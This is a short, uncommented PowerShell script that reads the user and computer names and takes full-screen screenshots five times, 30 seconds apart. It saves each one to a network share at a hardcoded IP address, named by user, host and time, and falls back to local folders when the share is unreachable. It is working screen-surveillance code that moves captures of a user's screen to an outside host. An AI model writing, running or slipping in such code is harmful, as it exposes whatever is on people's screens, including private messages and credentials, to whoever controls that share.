




Set-Variable -Name username -Value ("$env:UserName")
Write-Output $username	
Set-Variable -Name hname -Value ("$env:computername")
Write-Output $hname	

Set-Variable -Name i -Value (1)
While ($i -le 5){

Set-Variable -Name time -Value (Get-Date -format "dd-MMM-yyyy-HH-mm-ss")
Write-Output $time


if (Test-Path \\143.16.176.125\x) {
$File = "\\143.16.176.125\x\" + $username + "_" + $hname + "_" + $time + ".jpg"
}
ElseIf (Test-Path C:\HP) {
$File = "C:\HP\" + $username + "_" + $time + ".jpg"
}
ElseIf (Test-Path C:) {
$File = "C:\" + $username + "_" + $time + ".jpg"
}
Else {

exit
}

Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

Set-Variable -Name Screen -Value ([System.Windows.Forms.SystemInformation]::VirtualScreen)
Set-Variable -Name Width -Value ($Screen.Width)
Set-Variable -Name Height -Value ($Screen.Height)
Set-Variable -Name Left -Value ($Screen.Left)
Set-Variable -Name Top -Value ($Screen.Top)

Set-Variable -Name bitmap -Value (New-Object System.Drawing.Bitmap $Width, $Height)

Set-Variable -Name graphic -Value ([Drawing.Graphics]::FromImage($bitmap))

$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

$bitmap.Save($File, ([system.drawing.imaging.imageformat]::jpeg)) 
Write-Output "Screenshot saved to:"
Write-Output $File

$graphic.dispose()
$bitmap.dispose()

Start-Sleep -Seconds 30
$i++
}

exit


